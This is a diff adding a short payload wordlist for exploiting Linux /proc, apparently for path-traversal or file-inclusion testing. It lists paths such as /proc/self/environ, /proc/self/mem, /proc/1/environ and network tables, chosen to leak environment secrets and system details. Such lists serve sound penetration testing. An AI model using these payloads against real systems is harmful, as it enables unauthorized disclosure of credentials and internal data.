@@ -1,0 +1,71 @@
+# /proc/ Filesystem Exploitation Payloads
+# Target Linux /proc/ entries for sensitive information disclosure
+
+# File Descriptors (0-50)
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/self/fd/4
+/proc/self/fd/5
+/proc/self/fd/6
+/proc/self/fd/7
+/proc/self/fd/8
+/proc/self/fd/9
+/proc/self/fd/10
+/proc/self/fd/11
+/proc/self/fd/12
+/proc/self/fd/13
+/proc/self/fd/14
+/proc/self/fd/15
+/proc/self/fd/20
+/proc/self/fd/25
+/proc/self/fd/30
+/proc/self/fd/35
+/proc/self/fd/40
+/proc/self/fd/45
+/proc/self/fd/50
+
+# Process information
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/stat
+/proc/self/maps
+/proc/self/mem
+/proc/self/cwd
+/proc/self/exe
+/proc/self/root
+/proc/self/mountinfo
+/proc/self/mounts
+
+# Alternative PID references (common PIDs)
+/proc/1/environ
+/proc/1/cmdline
+/proc/1000/environ
+/proc/1000/cmdline
+/proc/self/../1/environ
+/proc/self/../self/environ
+
+# Network information
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/net/route
+/proc/net/arp
+
+# System information
+/proc/version
+/proc/cpuinfo
+/proc/meminfo
+/proc/devices
+/proc/filesystems
+/proc/modules
+/proc/mounts
+/proc/swaps
+/proc/partitions
+
+# Schedule/task information
+/proc/sched_debug
+/proc/timer_list
+/proc/buddyinfo
